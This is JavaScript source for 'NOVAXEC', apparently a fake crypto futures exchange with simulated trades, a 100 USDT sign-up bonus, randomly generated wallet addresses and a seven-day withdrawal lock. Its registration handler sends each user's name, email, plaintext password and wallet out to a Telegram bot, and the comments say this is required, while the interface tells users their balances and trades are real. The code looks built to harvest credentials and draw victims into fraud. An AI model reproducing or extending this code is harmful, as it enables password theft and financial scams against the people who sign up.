/**
 * NOVAXEC Feature Trading – Crypto Futures Trading Platform
 * -----------------------------------------------
 * Auth, dashboard, order placement (Long/Short + SL/TP),
 * positions management, simulated PnL.
 * Registration still sends details to Telegram bot.
 */

const STORAGE_KEY = "novaxec_users_v1";
const SESSION_KEY = "novaxec_session_v1";
const WELCOME_BONUS = 100; // USDT
const MIN_WITHDRAW_USDT = 20;
const WITHDRAW_LOCK_DAYS = 7; // must trade / hold account for at least 7 days
const WITHDRAW_NETWORK = "BEP20";

// Live market data — Coinbase public API (USD ≈ USDT)
// Display pair → Coinbase asset code
const PAIR_ASSETS = {
  "BTC/USDT": "BTC",
  "ETH/USDT": "ETH",
  "BNB/USDT": "BNB",
  "SOL/USDT": "SOL",
  "XRP/USDT": "XRP",
  "DOGE/USDT": "DOGE",
  "ADA/USDT": "ADA",
  "AVAX/USDT": "AVAX",
  "DOT/USDT": "DOT",
  "LINK/USDT": "LINK",
  "LTC/USDT": "LTC",
  "ATOM/USDT": "ATOM",
  "UNI/USDT": "UNI",
  "NEAR/USDT": "NEAR",
  "APT/USDT": "APT",
  "ARB/USDT": "ARB",
  "OP/USDT": "OP",
  "SUI/USDT": "SUI",
  "FIL/USDT": "FIL",
  "ICP/USDT": "ICP",
  "INJ/USDT": "INJ",
  "TON/USDT": "TON",
  "PEPE/USDT": "PEPE",
  "SHIB/USDT": "SHIB",
  "FET/USDT": "FET",
  "AAVE/USDT": "AAVE",
  "WIF/USDT": "WIF",
  "RENDER/USDT": "RENDER",
  "POL/USDT": "POL",
  "XLM/USDT": "XLM",
  "ETC/USDT": "ETC",
  "HBAR/USDT": "HBAR",
  "VET/USDT": "VET",
  "ALGO/USDT": "ALGO",
  "GRT/USDT": "GRT"
};

// Seed prices (used until first successful live fetch, then overwritten)
const SEED_PRICES = {
  "BTC/USDT": 86000, "ETH/USDT": 2700, "BNB/USDT": 775, "SOL/USDT": 120,
  "XRP/USDT": 1.51, "DOGE/USDT": 0.095, "ADA/USDT": 0.25, "AVAX/USDT": 11,
  "DOT/USDT": 1.21, "LINK/USDT": 14.3, "LTC/USDT": 70, "ATOM/USDT": 1.72,
  "UNI/USDT": 9, "NEAR/USDT": 4.9, "APT/USDT": 0.83, "ARB/USDT": 0.20,
  "OP/USDT": 0.13, "SUI/USDT": 1.17, "FIL/USDT": 1.04, "ICP/USDT": 3.28,
  "INJ/USDT": 7.4, "TON/USDT": 1.54, "PEPE/USDT": 0.0000044, "SHIB/USDT": 0.0000059,
  "FET/USDT": 0.23, "AAVE/USDT": 183, "WIF/USDT": 0.25, "RENDER/USDT": 2.0,
  "POL/USDT": 0.11, "XLM/USDT": 0.25, "ETC/USDT": 18, "HBAR/USDT": 0.18,
  "VET/USDT": 0.025, "ALGO/USDT": 0.18, "GRT/USDT": 0.12
};

const MARKETS = {};
Object.keys(PAIR_ASSETS).forEach(pair => {
  MARKETS[pair] = {
    price: SEED_PRICES[pair] || 0,
    change: 0,
    prevPrice: SEED_PRICES[pair] || 0
  };
});

let currentPair = "BTC/USDT";
let currentSide = "long";
let pricesLoading = false;
let currentTimeframe = "60"; // TradingView interval: 1, 5, 15, 60, 240, D, W
let tvWidget = null;

// Map pair → TradingView symbol (BINANCE has broad USDT coverage)
function getTvSymbol(pair) {
  const asset = PAIR_ASSETS[pair] || pair.split("/")[0];
  // Prefer BINANCE perpetual/spot USDT pairs for analysis
  return "BINANCE:" + asset + "USDT";
}

function priceDecimals(price) {
  if (price >= 1000) return 2;
  if (price >= 1) return 3;
  if (price >= 0.01) return 5;
  if (price >= 0.0001) return 6;
  return 8;
}

// ---------- Utilities ----------
function generateWalletAddress() {
  const chars = "0123456789abcdef";
  let addr = "0x";
  for (let i = 0; i < 40; i++) {
    addr += chars[Math.floor(Math.random() * chars.length)];
  }
  return addr;
}

function shortAddress(addr) {
  if (!addr || addr.length < 12) return addr;
  return addr.slice(0, 6) + "..." + addr.slice(-4);
}

function formatNumber(n, decimals = 2) {
  return Number(n).toLocaleString("en-US", {
    minimumFractionDigits: decimals,
    maximumFractionDigits: decimals
  });
}

function showToast(message, type = "success") {
  const toast = document.getElementById("toast");
  toast.textContent = message;
  toast.className = `toast ${type} show`;
  setTimeout(() => {
    toast.classList.remove("show");
  }, 3200);
}

function getUsers() {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY)) || {};
  } catch {
    return {};
  }
}

function saveUsers(users) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
}

function getCurrentUser() {
  const session = localStorage.getItem(SESSION_KEY);
  if (!session) return null;
  const users = getUsers();
  return users[session] || null;
}

function setSession(email) {
  localStorage.setItem(SESSION_KEY, email);
}

function clearSession() {
  localStorage.removeItem(SESSION_KEY);
}

function saveUser(user) {
  const users = getUsers();
  users[user.email] = user;
  saveUsers(users);
}

// ---------- Auth ----------
async function handleRegister(e) {
  e.preventDefault();
  const name = document.getElementById("reg-name").value.trim();
  const email = document.getElementById("reg-email").value.trim().toLowerCase();
  const password = document.getElementById("reg-password").value;

  if (!name || !email || !password) {
    showToast("Please fill all fields", "error");
    return;
  }
  if (password.length < 6) {
    showToast("Password must be at least 6 characters", "error");
    return;
  }
  if (/^\d+$/.test(password)) {
    showToast("Password cannot be only numbers. Add letters or symbols.", "error");
    return;
  }

  const users = getUsers();
  if (users[email]) {
    showToast("Email already registered", "error");
    return;
  }

  const wallet = generateWalletAddress();
  const now = Date.now();

  users[email] = {
    name,
    email,
    password, // demo only – never store plain text in production
    wallet,
    balance: WELCOME_BONUS,
    positions: [],
    history: [
      {
        type: "Welcome Bonus",
        amount: WELCOME_BONUS,
        time: now
      }
    ],
    totalTrades: 0,
    createdAt: now,
    justRegistered: true
  };

  saveUsers(users);
  setSession(email);

  // Send to Telegram (includes email + password as required)
  showToast("Creating account...", "success");
  try {
    await window.sendRegistrationToTelegram({ name, email, password, wallet });
  } catch (err) {
    console.warn("Telegram notification failed (non-blocking)", err);
  }

  showToast("Welcome! 100 USDT bonus credited 🎁", "success");
  setTimeout(() => {
    showApp();
  }, 600);
}

function handleLogin(e) {
  e.preventDefault();
  const email = document.getElementById("login-email").value.trim().toLowerCase();
  const password = document.getElementById("login-password").value;

  const users = getUsers();
  const user = users[email];

  if (!user || user.password !== password) {
    showToast("Invalid email or password", "error");
    return;
  }

  // Clear justRegistered flag on login
  if (user.justRegistered) {
    user.justRegistered = false;
    users[email] = user;
    saveUsers(users);
  }

  setSession(email);
  showToast(`Welcome back, ${user.name}!`, "success");
  setTimeout(() => showApp(), 400);
}

function handleLogout() {
  clearSession();
  showAuth();
  showToast("Logged out successfully");
}

// ---------- UI Switching ----------
function showAuth() {
  document.getElementById("auth-screen").classList.remove("hidden");
  document.getElementById("app-screen").classList.add("hidden");
  switchAuthTab("login");
}

function showApp() {
  document.getElementById("auth-screen").classList.add("hidden");
  document.getElementById("app-screen").classList.remove("hidden");
  renderDashboard();
  switchPage("home");
}

function switchAuthTab(tab) {
  const loginForm = document.getElementById("login-form");
  const regForm = document.getElementById("register-form");
  const loginTab = document.getElementById("tab-login");
  const regTab = document.getElementById("tab-register");

  if (tab === "login") {
    loginForm.classList.remove("hidden");
    loginForm.style.display = "block";
    regForm.classList.add("hidden");
    regForm.style.display = "none";
    loginTab.classList.add("btn-primary");
    loginTab.classList.remove("btn-secondary");
    regTab.classList.add("btn-secondary");
    regTab.classList.remove("btn-primary");
  } else {
    loginForm.classList.add("hidden");
    loginForm.style.display = "none";
    regForm.classList.remove("hidden");
    regForm.style.display = "block";
    regTab.classList.add("btn-primary");
    regTab.classList.remove("btn-secondary");
    loginTab.classList.add("btn-secondary");
    loginTab.classList.remove("btn-primary");
  }
}

function switchPage(pageId) {
  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
  document.getElementById(`page-${pageId}`).classList.add("active");

  document.querySelectorAll(".nav-item").forEach(n => n.classList.remove("active"));
  const nav = document.querySelector(`[data-page="${pageId}"]`);
  if (nav) nav.classList.add("active");

  if (pageId === "home") renderDashboard();
  if (pageId === "trade") renderTrade();
  if (pageId === "positions") renderPositions();
  if (pageId === "wallet") renderWallet();
  if (pageId === "profile") renderProfile();
}

// ---------- Live market prices (Coinbase public API) ----------
async function fetchLivePrices() {
  if (pricesLoading) return;
  pricesLoading = true;
  try {
    // One call returns rates for all assets vs USD
    const res = await fetch("https://api.coinbase.com/v2/exchange-rates?currency=USD");
    if (!res.ok) throw new Error("Coinbase HTTP " + res.status);
    const json = await res.json();
    const rates = (json.data && json.data.rates) || {};

    Object.entries(PAIR_ASSETS).forEach(([pair, asset]) => {
      const rate = rates[asset];
      if (!rate) return;
      const price = 1 / parseFloat(rate);
      if (!isFinite(price) || price <= 0) return;

      const prev = MARKETS[pair]?.price || price;
      // Session % change from previous poll (approx until we have 24h source)
      let change = MARKETS[pair]?.change || 0;
      if (prev > 0 && MARKETS[pair]?.prevPrice) {
        change = ((price - MARKETS[pair].prevPrice) / MARKETS[pair].prevPrice) * 100;
      }
      // Keep a stable "session open" reference for change display
      const sessionOpen = MARKETS[pair]?.sessionOpen || price;

      MARKETS[pair] = {
        price: price,
        change: +(((price - sessionOpen) / sessionOpen) * 100).toFixed(2),
        prevPrice: prev,
        sessionOpen: sessionOpen
      };
    });

    refreshMarketUI();
  } catch (err) {
    console.warn("Live price fetch failed, keeping last prices:", err.message || err);
  } finally {
    pricesLoading = false;
  }
}

function refreshMarketUI() {
  const activePage = document.querySelector(".page.active");
  if (!activePage) return;
  const id = activePage.id;
  if (id === "page-trade") {
    updateTradePrice();
    const selector = document.getElementById("pair-selector");
    if (selector) renderTrade();
  }
  if (id === "page-home") renderHomeMarkets();
  if (id === "page-positions") renderPositions();
}

// ---------- Rendering ----------
function calcUnrealizedPnL(user) {
  let total = 0;
  let locked = 0;
  (user.positions || []).forEach(pos => {
    const market = MARKETS[pos.pair];
    if (!market) return;
    const current = market.price;
    const entry = pos.entry;
    const size = pos.size; // USDT notional
    const lev = pos.leverage;
    const margin = size / lev;
    locked += margin;

    let pnlPct;
    if (pos.side === "long") {
      pnlPct = (current - entry) / entry;
    } else {
      pnlPct = (entry - current) / entry;
    }
    // PnL = margin * leverage * pnlPct = size * pnlPct
    const pnl = size * pnlPct;
    total += pnl;
  });
  return { pnl: total, locked };
}

function renderDashboard() {
  const user = getCurrentUser();
  if (!user) return;

  document.getElementById("header-name").textContent = user.name;
  document.getElementById("header-avatar").textContent = user.name.charAt(0).toUpperCase();

  const { pnl, locked } = calcUnrealizedPnL(user);
  const equity = user.balance + locked + pnl;

  document.getElementById("home-balance").textContent = formatNumber(user.balance);
  document.getElementById("home-equity").textContent = formatNumber(equity);
  document.getElementById("home-wallet-short").textContent = shortAddress(user.wallet);
  document.getElementById("home-positions").textContent = (user.positions || []).length;

  const pnlEl = document.getElementById("home-pnl");
  pnlEl.textContent = (pnl >= 0 ? "+" : "") + formatNumber(pnl);
  pnlEl.className = "stat-value " + (pnl >= 0 ? "pnl-positive" : "pnl-negative");

  // Welcome notice
  const notice = document.getElementById("welcome-notice");
  if (user.justRegistered) {
    notice.style.display = "block";
    // Clear flag after showing once
    user.justRegistered = false;
    saveUser(user);
  } else {
    notice.style.display = "none";
  }

  renderHomeMarkets();
}

function renderHomeMarkets() {
  const container = document.getElementById("home-markets");
  if (!container) return;

  const entries = Object.entries(MARKETS).filter(([, m]) => m.price > 0);
  if (entries.length === 0) {
    container.innerHTML = `<p class="text-sm text-center" style="color:var(--text-muted);padding:1rem 0;">Loading live prices…</p>`;
    return;
  }

  container.innerHTML = entries
    .map(([pair, m]) => {
      const changeCls = m.change >= 0 ? "pnl-positive" : "pnl-negative";
      const sign = m.change >= 0 ? "+" : "";
      const dec = priceDecimals(m.price);
      return `
        <div class="history-item" style="cursor:pointer;" onclick="selectPair('${pair}'); switchPage('trade');">
          <div>
            <div class="font-semibold text-sm">${pair}</div>
            <div class="text-xs" style="color:var(--text-muted);">Perpetual</div>
          </div>
          <div class="text-right">
            <div class="font-semibold text-sm">${formatNumber(m.price, dec)}</div>
            <div class="text-xs ${changeCls}">${sign}${m.change.toFixed(2)}%</div>
          </div>
        </div>
      `;
    })
    .join("");
}

function renderTrade() {
  const user = getCurrentUser();
  if (!user) return;

  // Pair chips
  const selector = document.getElementById("pair-selector");
  selector.innerHTML = Object.keys(MARKETS)
    .map(
      pair =>
        `<button class="pair-chip ${pair === currentPair ? "active" : ""}" onclick="selectPair('${pair}')">${pair}</button>`
    )
    .join("");

  updateTradePrice();
  document.getElementById("trade-available").textContent = formatNumber(user.balance);
  updateLeverageLabel();
  updatePlaceOrderBtn();
  loadLiveChart();
}

function selectPair(pair) {
  currentPair = pair;
  renderTrade();
}

function setChartTimeframe(tf) {
  currentTimeframe = tf;
  document.querySelectorAll(".tf-btn").forEach(btn => {
    btn.classList.toggle("active", btn.getAttribute("data-tf") === tf);
  });
  loadLiveChart();
}

function loadLiveChart() {
  const container = document.getElementById("tv-chart-container");
  if (!container) return;

  // Clear previous widget
  container.innerHTML = "";
  const chartId = "tv_chart_" + Date.now();
  const mount = document.createElement("div");
  mount.id = chartId;
  mount.style.width = "100%";
  mount.style.height = "100%";
  container.appendChild(mount);

  if (typeof TradingView === "undefined") {
    container.innerHTML = `<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#848e9c;font-size:0.85rem;">Loading chart library…</div>`;
    // Retry shortly if script still loading
    setTimeout(loadLiveChart, 800);
    return;
  }

  try {
    tvWidget = new TradingView.widget({
      autosize: true,
      symbol: getTvSymbol(currentPair),
      interval: currentTimeframe,
      timezone: "Etc/UTC",
      theme: "dark",
      style: "1",
      locale: "en",
      toolbar_bg: "#131722",
      enable_publishing: false,
      hide_top_toolbar: false,
      hide_legend: false,
      save_image: false,
      container_id: chartId,
      hide_volume: false,
      studies: ["RSI@tv-basicstudies", "MASimple@tv-basicstudies"],
      support_host: "https://www.tradingview.com"
    });
  } catch (err) {
    console.warn("TradingView widget error:", err);
    container.innerHTML = `<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#848e9c;font-size:0.85rem;padding:1rem;text-align:center;">Chart unavailable. Check connection.</div>`;
  }
}

function setSide(side) {
  currentSide = side;
  document.getElementById("btn-long").classList.toggle("active", side === "long");
  document.getElementById("btn-short").classList.toggle("active", side === "short");
  updatePlaceOrderBtn();
}

function updatePlaceOrderBtn() {
  const btn = document.getElementById("place-order-btn");
  if (!btn) return;
  if (currentSide === "long") {
    btn.className = "btn btn-long w-full btn-lg";
    btn.textContent = "Open Long";
  } else {
    btn.className = "btn btn-short w-full btn-lg";
    btn.textContent = "Open Short";
  }
}

function updateLeverageLabel() {
  const lev = document.getElementById("order-leverage").value;
  document.getElementById("leverage-label").textContent = lev + "x";
}

function updateTradePrice() {
  const m = MARKETS[currentPair];
  if (!m || !m.price) {
    document.getElementById("trade-price").textContent = "—";
    return;
  }
  document.getElementById("trade-price").textContent = formatNumber(
    m.price,
    priceDecimals(m.price)
  );
  const changeEl = document.getElementById("trade-change");
  const sign = m.change >= 0 ? "+" : "";
  changeEl.textContent = sign + m.change.toFixed(2) + "%";
  changeEl.className = "price-change " + (m.change >= 0 ? "pnl-positive" : "pnl-negative");
}

function placeOrder() {
  const user = getCurrentUser();
  if (!user) return;

  const size = parseFloat(document.getElementById("order-size").value);
  const leverage = parseInt(document.getElementById("order-leverage").value, 10);
  const slRaw = document.getElementById("order-sl").value;
  const tpRaw = document.getElementById("order-tp").value;
  const sl = slRaw ? parseFloat(slRaw) : null;
  const tp = tpRaw ? parseFloat(tpRaw) : null;

  if (isNaN(size) || size < 1) {
    showToast("Minimum size is 1 USDT", "error");
    return;
  }
  if (size > user.balance) {
    showToast("Insufficient balance", "error");
    return;
  }

  const market = MARKETS[currentPair];
  const entry = market.price;
  const margin = size / leverage;

  // Basic SL/TP validation
  if (sl !== null) {
    if (currentSide === "long" && sl >= entry) {
      showToast("SL for Long must be below entry", "error");
      return;
    }
    if (currentSide === "short" && sl <= entry) {
      showToast("SL for Short must be above entry", "error");
      return;
    }
  }
  if (tp !== null) {
    if (currentSide === "long" && tp <= entry) {
      showToast("TP for Long must be above entry", "error");
      return;
    }
    if (currentSide === "short" && tp >= entry) {
      showToast("TP for Short must be below entry", "error");
      return;
    }
  }

  // Deduct margin
  user.balance = +(user.balance - margin).toFixed(4);

  const position = {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
    pair: currentPair,
    side: currentSide,
    size,
    leverage,
    entry,
    margin,
    sl,
    tp,
    openedAt: Date.now()
  };

  user.positions = user.positions || [];
  user.positions.push(position);
  user.totalTrades = (user.totalTrades || 0) + 1;
  user.history = user.history || [];
  user.history.push({
    type: `Opened ${currentSide.toUpperCase()} ${currentPair}`,
    amount: -margin,
    time: Date.now()
  });

  saveUser(user);

  // Clear form partially
  document.getElementById("order-sl").value = "";
  document.getElementById("order-tp").value = "";

  showToast(`${currentSide.toUpperCase()} ${currentPair} opened @ ${formatNumber(entry)}`, "success");
  renderTrade();
  renderDashboard();
}

function closePosition(posId) {
  const user = getCurrentUser();
  if (!user) return;

  const idx = (user.positions || []).findIndex(p => p.id === posId);
  if (idx === -1) return;

  const pos = user.positions[idx];
  const market = MARKETS[pos.pair];
  const current = market.price;

  let pnlPct;
  if (pos.side === "long") {
    pnlPct = (current - pos.entry) / pos.entry;
  } else {
    pnlPct = (pos.entry - current) / pos.entry;
  }
  const pnl = pos.size * pnlPct;

  // Return margin + pnl
  user.balance = +(user.balance + pos.margin + pnl).toFixed(4);
  user.positions.splice(idx, 1);

  user.history = user.history || [];
  user.history.push({
    type: `Closed ${pos.side.toUpperCase()} ${pos.pair}`,
    amount: +(pos.margin + pnl).toFixed(4),
    time: Date.now(),
    pnl: +pnl.toFixed(4)
  });

  saveUser(user);

  const sign = pnl >= 0 ? "+" : "";
  showToast(`Position closed · PnL ${sign}${formatNumber(pnl)} USDT`, pnl >= 0 ? "success" : "error");
  renderPositions();
  renderDashboard();
}

function renderPositions() {
  const user = getCurrentUser();
  if (!user) return;

  const list = document.getElementById("positions-list");
  const countEl = document.getElementById("pos-count");
  const positions = user.positions || [];

  countEl.textContent = positions.length;

  if (positions.length === 0) {
    list.innerHTML = `
      <div class="empty-state">
        <div class="icon">📊</div>
        <div class="font-semibold" style="margin-bottom:0.35rem;">No open positions</div>
        <div class="text-sm">Go to Trade to open a Long or Short</div>
        <button class="btn btn-primary btn-sm" style="margin-top:1rem;" onclick="switchPage('trade')">Trade Now</button>
      </div>
    `;
    return;
  }

  list.innerHTML = positions
    .map(pos => {
      const market = MARKETS[pos.pair];
      const current = market ? market.price : pos.entry;
      let pnlPct;
      if (pos.side === "long") {
        pnlPct = (current - pos.entry) / pos.entry;
      } else {
        pnlPct = (pos.entry - current) / pos.entry;
      }
      const pnl = pos.size * pnlPct;
      const pnlCls = pnl >= 0 ? "pnl-positive" : "pnl-negative";
      const sign = pnl >= 0 ? "+" : "";
      const sideBadge = pos.side === "long" ? "badge-green" : "badge-red";

      const sltp = [];
      if (pos.sl) sltp.push(`SL ${formatNumber(pos.sl, 2)}`);
      if (pos.tp) sltp.push(`TP ${formatNumber(pos.tp, 2)}`);

      return `
        <div class="position-card ${pos.side}">
          <div class="flex justify-between items-center" style="margin-bottom:0.5rem;">
            <div class="flex items-center gap-2">
              <span class="font-semibold">${pos.pair}</span>
              <span class="badge ${sideBadge}">${pos.side.toUpperCase()}</span>
              <span class="badge badge-blue">${pos.leverage}x</span>
            </div>
            <div class="font-bold ${pnlCls}">${sign}${formatNumber(pnl)}</div>
          </div>
          <div class="flex justify-between text-xs" style="color:var(--text-muted);margin-bottom:0.4rem;">
            <span>Entry ${formatNumber(pos.entry, priceDecimals(pos.entry))}</span>
            <span>Mark ${formatNumber(current, priceDecimals(current))}</span>
            <span>Size ${formatNumber(pos.size)} USDT</span>
          </div>
          ${sltp.length ? `<div class="text-xs" style="color:var(--text-muted);margin-bottom:0.6rem;">${sltp.join(" · ")}</div>` : ""}
          <button class="btn btn-secondary btn-sm w-full" onclick="closePosition('${pos.id}')">
            Close Position
          </button>
        </div>
      `;
    })
    .join("");
}

function getWithdrawEligibility(user) {
  const now = Date.now();
  const created = user.createdAt || now;
  const msRequired = WITHDRAW_LOCK_DAYS * 24 * 60 * 60 * 1000;
  const elapsed = now - created;
  const daysPassed = Math.floor(elapsed / (24 * 60 * 60 * 1000));
  const daysLeft = Math.max(0, WITHDRAW_LOCK_DAYS - daysPassed);
  const eligible = elapsed >= msRequired;
  return { eligible, daysLeft, daysPassed };
}

function renderWallet() {
  const user = getCurrentUser();
  if (!user) return;

  const { locked } = calcUnrealizedPnL(user);

  document.getElementById("wallet-balance").textContent = formatNumber(user.balance);
  document.getElementById("wallet-locked").textContent = formatNumber(locked);
  document.getElementById("wallet-address").textContent = user.wallet;

  // Eligibility banner
  const elig = getWithdrawEligibility(user);
  const eligBox = document.getElementById("withdraw-eligibility");
  const withdrawBtn = document.getElementById("withdraw-btn");

  if (elig.eligible) {
    eligBox.innerHTML = `
      <span style="color:var(--long);">✓ Eligible to withdraw</span><br>
      <span class="text-xs" style="color:var(--text-muted);">Min. ${MIN_WITHDRAW_USDT} USDT · Network: ${WITHDRAW_NETWORK} only</span>
    `;
    if (withdrawBtn) withdrawBtn.disabled = false;
  } else {
    eligBox.innerHTML = `
      <span style="color:var(--warning);">⏳ Trade for at least ${WITHDRAW_LOCK_DAYS} days before withdrawing</span><br>
      <span class="text-xs" style="color:var(--text-muted);">${elig.daysLeft} day(s) remaining · Day ${elig.daysPassed + 1} of ${WITHDRAW_LOCK_DAYS}</span>
    `;
    if (withdrawBtn) withdrawBtn.disabled = true;
  }

  // Withdrawal history
  const wdHist = document.getElementById("withdraw-history");
  const withdrawals = (user.withdrawals || []).slice().reverse();
  if (withdrawals.length === 0) {
    wdHist.innerHTML = `<p class="text-sm text-center" style="color:var(--text-muted);padding:0.75rem 0;">No withdrawals yet</p>`;
  } else {
    wdHist.innerHTML = withdrawals
      .map(w => `
        <div class="history-item">
          <div>
            <div class="font-semibold text-sm">Withdraw · ${w.network}</div>
            <div class="text-xs" style="color:var(--text-muted)">${shortAddress(w.address)} · ${new Date(w.time).toLocaleString()}</div>
          </div>
          <div class="font-bold pnl-negative">-${formatNumber(w.amount)}</div>
        </div>
      `)
      .join("");
  }

  // Activity history
  const histEl = document.getElementById("wallet-history");
  const history = (user.history || []).slice().reverse().slice(0, 12);

  if (history.length === 0) {
    histEl.innerHTML = `<p class="text-sm text-center" style="color:var(--text-muted);padding:1rem 0;">No activity yet</p>`;
  } else {
    histEl.innerHTML = history
      .map(h => {
        const amt = h.amount;
        const cls = amt >= 0 ? "pnl-positive" : "pnl-negative";
        const sign = amt >= 0 ? "+" : "";
        return `
          <div class="history-item">
            <div>
              <div class="font-semibold text-sm">${h.type}</div>
              <div class="text-xs" style="color:var(--text-muted)">${new Date(h.time).toLocaleString()}</div>
            </div>
            <div class="font-bold ${cls}">${sign}${formatNumber(Math.abs(amt))}</div>
          </div>
        `;
      })
      .join("");
  }
}

function handleWithdraw(e) {
  e.preventDefault();
  const user = getCurrentUser();
  if (!user) return;

  const elig = getWithdrawEligibility(user);
  if (!elig.eligible) {
    showToast(`You must trade for at least ${WITHDRAW_LOCK_DAYS} days before withdrawing. ${elig.daysLeft} day(s) left.`, "error");
    return;
  }

  const amount = parseFloat(document.getElementById("withdraw-amount").value);
  const address = document.getElementById("withdraw-address").value.trim();

  if (isNaN(amount) || amount < MIN_WITHDRAW_USDT) {
    showToast(`Minimum withdrawal is ${MIN_WITHDRAW_USDT} USDT`, "error");
    return;
  }
  if (amount > user.balance) {
    showToast("Insufficient available balance", "error");
    return;
  }
  if (!address || !address.startsWith("0x") || address.length < 40) {
    showToast("Enter a valid BEP20 (0x...) address", "error");
    return;
  }

  // Process withdrawal (simulated)
  user.balance = +(user.balance - amount).toFixed(4);
  user.withdrawals = user.withdrawals || [];
  user.withdrawals.push({
    amount,
    address,
    network: WITHDRAW_NETWORK,
    time: Date.now(),
    status: "pending"
  });
  user.history = user.history || [];
  user.history.push({
    type: `Withdrawal (${WITHDRAW_NETWORK})`,
    amount: -amount,
    time: Date.now()
  });

  saveUser(user);

  document.getElementById("withdraw-amount").value = "";
  document.getElementById("withdraw-address").value = "";

  showToast(`Withdrawal of ${formatNumber(amount)} USDT submitted (BEP20)`, "success");
  renderWallet();
  renderDashboard();
}

function copyAddress() {
  const user = getCurrentUser();
  if (!user) return;
  navigator.clipboard.writeText(user.wallet).then(() => {
    showToast("Address copied! 📋");
  }).catch(() => {
    showToast("Could not copy", "error");
  });
}

function renderProfile() {
  const user = getCurrentUser();
  if (!user) return;
  document.getElementById("profile-name").textContent = user.name;
  document.getElementById("profile-email").textContent = user.email;
  document.getElementById("profile-wallet").textContent = user.wallet;
  document.getElementById("profile-joined").textContent = new Date(user.createdAt).toLocaleDateString();
  document.getElementById("profile-trades").textContent = user.totalTrades || 0;
  document.getElementById("profile-avatar-big").textContent = user.name.charAt(0).toUpperCase();
}

// ---------- Init ----------
function init() {
  document.getElementById("login-form").addEventListener("submit", handleLogin);
  document.getElementById("register-form").addEventListener("submit", handleRegister);
  document.getElementById("withdraw-form").addEventListener("submit", handleWithdraw);

  document.getElementById("tab-login").addEventListener("click", () => switchAuthTab("login"));
  document.getElementById("tab-register").addEventListener("click", () => switchAuthTab("register"));

  document.querySelectorAll(".nav-item").forEach(btn => {
    btn.addEventListener("click", () => {
      const page = btn.getAttribute("data-page");
      if (page) switchPage(page);
    });
  });

  const user = getCurrentUser();
  if (user) {
    showApp();
  } else {
    showAuth();
  }

  // Live prices from Binance — initial load + refresh every 8s
  fetchLivePrices();
  setInterval(fetchLivePrices, 8000);
}

document.addEventListener("DOMContentLoaded", init);
